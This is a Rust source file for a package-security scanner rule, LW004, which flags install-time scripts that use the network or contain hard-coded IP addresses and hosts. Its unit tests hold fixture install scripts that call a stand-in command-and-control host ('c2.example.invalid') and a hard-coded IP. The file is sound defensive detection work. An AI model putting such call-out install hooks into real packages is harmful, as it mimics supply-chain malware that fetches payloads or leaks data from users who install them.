//! LW004: install-time code uses the network.
//!
//! A package rarely needs the network while it is being installed; when it
//! does (downloading a prebuilt binary), it is also the channel attackers use
//! to fetch a second stage or send stolen data out. A hard-coded IP address
//! or host name in the same file is reported as extra evidence.

use super::{Finding, Rule, Severity};
use crate::context::{InstallSource, PackageContext};

pub struct InstallNetworkAccess;

/// Shared with LW005 and the scorer: does this install-time source use the
/// network?
pub fn uses_network(source: &InstallSource<'_>) -> bool {
    !source.facts.network.is_empty()
}

impl Rule for InstallNetworkAccess {
    fn id(&self) -> &'static str {
        "LW004"
    }
    fn name(&self) -> &'static str {
        "Install-time network access"
    }
    fn severity(&self) -> Severity {
        Severity::High
    }
    fn description(&self) -> &'static str {
        "a file run at install time requires http, https, net, dns, dgram (or a common HTTP \
         client) or calls fetch; extra evidence for hard-coded IP addresses and host names"
    }

    fn check(&self, ctx: &PackageContext) -> Vec<Finding> {
        let mut findings = Vec::new();
        for source in ctx.install_sources() {
            if !uses_network(&source) {
                continue;
            }
            let line = |l: u32| source.has_lines.then_some(l);
            let mut modules: Vec<&str> = source
                .facts
                .network
                .iter()
                .map(|h| h.detail.as_str())
                .collect();
            modules.sort_unstable();
            modules.dedup();
            for hit in &source.facts.network {
                findings.push(self.finding(
                    ctx,
                    Some(source.file),
                    line(hit.line),
                    &hit.evidence,
                    format!("Install-time code uses the network ({}).", hit.detail),
                ));
            }
            for host in source.facts.hosts.iter().take(3) {
                let what = if host.is_ip {
                    "a hard-coded IP address"
                } else {
                    "a hard-coded host"
                };
                findings.push(self.finding(
                    ctx,
                    Some(source.file),
                    line(host.hit.line),
                    &host.hit.evidence,
                    format!(
                        "Install-time code makes a network request ({}) and contains {what} ({}).",
                        modules.join(", "),
                        host.host
                    ),
                ));
            }
        }
        findings
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::rules::test_helpers::ctx;

    const PKG: &str = r#"{"scripts": {"postinstall": "node install.js"}}"#;

    #[test]
    fn https_get_to_hard_coded_ip() {
        let c = ctx(
            "p",
            &[
                ("package.json", PKG),
                (
                    "install.js",
                    "const https = require('https');\nhttps.get('http://203.0.113.5/p');",
                ),
            ],
        );
        let f = InstallNetworkAccess.check(&c);
        assert_eq!(f.len(), 2);
        assert!(f[1]
            .explanation
            .contains("hard-coded IP address (203.0.113.5)"));
        assert_eq!(f[1].line, Some(2));
    }

    #[test]
    fn fetch_in_esm_install_file() {
        let c = ctx(
            "p",
            &[
                (
                    "package.json",
                    r#"{"scripts": {"install": "node setup.mjs"}}"#,
                ),
                (
                    "setup.mjs",
                    "await fetch(`https://c2.example.invalid/${process.pid}`);",
                ),
            ],
        );
        let f = InstallNetworkAccess.check(&c);
        assert_eq!(f.len(), 2, "{f:?}");
        assert!(f[0].explanation.contains("fetch()"));
        assert!(f[1]
            .explanation
            .contains("a hard-coded host (c2.example.invalid)"));
    }

    #[test]
    fn network_code_that_does_not_run_at_install_is_ignored() {
        let c = ctx(
            "p",
            &[
                ("package.json", r#"{"main": "client.js"}"#),
                (
                    "client.js",
                    "require('https').get('https://api.example.invalid');",
                ),
            ],
        );
        assert!(InstallNetworkAccess.check(&c).is_empty());
    }
}
